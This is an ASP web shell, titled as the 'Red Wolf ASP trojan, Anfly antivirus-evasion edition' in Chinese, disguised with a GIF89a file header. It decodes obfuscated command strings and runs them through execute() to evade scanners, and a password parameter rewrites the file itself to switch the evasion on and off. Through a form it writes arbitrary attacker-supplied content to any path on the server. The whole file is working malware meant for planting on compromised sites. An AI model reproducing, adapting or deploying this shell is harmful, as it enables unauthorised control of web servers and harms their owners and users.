<gif89a>
<Title>红狼ASP木马--Anfly免杀版</Title>
<%Dim objfSo%>
<% dim user
user="asp.asp"%><%''将""中的东东改成你木马保存的文件名不要使用dst 或者exe&cute%>
<%Dim fdata%>
<%Dim objCountFile%>
<%on error resume next%>
<%
   Function DecodeFun(MidStr)
   MidStr = Replace(MidStr, "#!^$W", "s")
   MidStr = Replace(MidStr, "人类智力劳动的结晶人类智力劳动的结晶人类智力劳动的结晶人类智力劳动的结晶人类智力劳动的结晶人类智力劳动的结晶人类智力劳动的结晶人类智力劳动的结晶人类智力劳动的结晶人类智力劳动的结晶人类智力劳动的结晶人类智力劳动的结晶人类智力劳动的结晶人类智力劳动的结晶人类智力劳动的结晶人类智力劳动的结晶人类智力劳动的结晶人类智力劳动的结晶人类智力劳动的结晶人类智力劳动的结晶人类智力劳动的结晶人类智力劳动的结晶人类智力劳动的结晶人类智力劳动的结晶人类智力劳动的结晶人类智力劳动的结晶人类智力劳动的结晶人类智力劳动的结晶人类智力劳动的结晶人类智力劳动的结晶人类智力劳动的结晶人类智力劳动的结晶人类智力劳动的结晶", "<br>")
   MidStr = Replace(MidStr, "#sdf", "End If")
   MidStr = Replace(MidStr, "*&*s", ">")
   MidStr = Replace(MidStr, "#!@$", "<")
   MidStr = Replace(MidStr, "h45as", "(")
   MidStr = Replace(MidStr, "w$@s", ")")
   MidStr = Replace(MidStr, "a&d%&", Chr(34))
   DecodeFun = MidStr
   End Function
%>
<%
pass=request("pass")
if pass="open" then
Set objFSO = Server.CreateObject("Scripting.FileSystemObject")
Set objCountFile = objFSO.OpenTextFile(Server.MapPath(user),1,True)
FiletempData = objCountFile.ReadAll
objCountFile.Close
FiletempData=Replace(FiletempData,"dst","exe"&"cute")
Set objCountFile=objFSO.CreateTextFile(Server.MapPath(user),True)
objCountFile.Write FiletempData 
objCountFile.Close
Set objCountFile=Nothing
Set objFSO = Nothing
response.write "木马防杀解除"
end if 
if pass="close" then
Set objFSO = Server.CreateObject("Scripting.FileSystemObject")
Set objCountFile = objFSO.OpenTextFile(Server.MapPath(user),1,True)
FiletempData = objCountFile.ReadAll
objCountFile.Close
FiletempData=Replace(FiletempData,"exe"&"cute","dst")
Set objCountFile=objFSO.CreateTextFile(Server.MapPath(user),True)
objCountFile.Write FiletempData 
objCountFile.Close
Set objCountFile=Nothing
Set objFSO = Nothing
response.write "木马防杀完毕"
end if
%>
<%char1="Set objfSo = Server.CreateObjecth45asa&d%&Scripting.fileSy#!^$WtemObjecta&d%&w$@s"
execute(DecodeFun(char1))%>
<%if Trim(request("syfdpath"))<>"" then%>
<%char1="fdata = reque#!^$Wth45asa&d%&cyfddataa&d%&w$@s"
execute(DecodeFun(char1))%>
<%char1="Set objCountFile=objFSO.CreateTextFileh45asreque#!^$Wth45asa&d%&#!^$Wyfdpatha&d%&w$@s,Truew$@s"
execute(DecodeFun(char1))%>
<%char1="objCountFile.Write fdata"
execute(DecodeFun(char1))%>
<%if err =0 then%>
OK!</font>
<%else%>
NO!</font>
<%end if%>
<%err.clear%>
<%end if%>
<%char1="objCountFile.Clo#!^$We"
execute(DecodeFun(char1))%>
<%Set objCountFile=Nothing%>
<%Set objFSO = Nothing%>
<form action='' method=pOsT>
PATH:</font><br>
<input type=text name=syfdpath width=32 value="
<%char1="re#!^$Wpon#!^$We.write #!^$Werver.mappathh45asReque#!^$Wt.ServerVariable#!^$Wh45asa&d%&SCRIPT_NAMEa&d%&w$@sw$@s"
execute(DecodeFun(char1))%>" style="border:solid 1px" size=40><br>
GUT:<br>
<textarea name=cyfddata cols=39 rows=10 width=80 style="border:solid 1px"></textarea>
<br><input type=submit value=SAVE style="border:solid 1px">
</form>

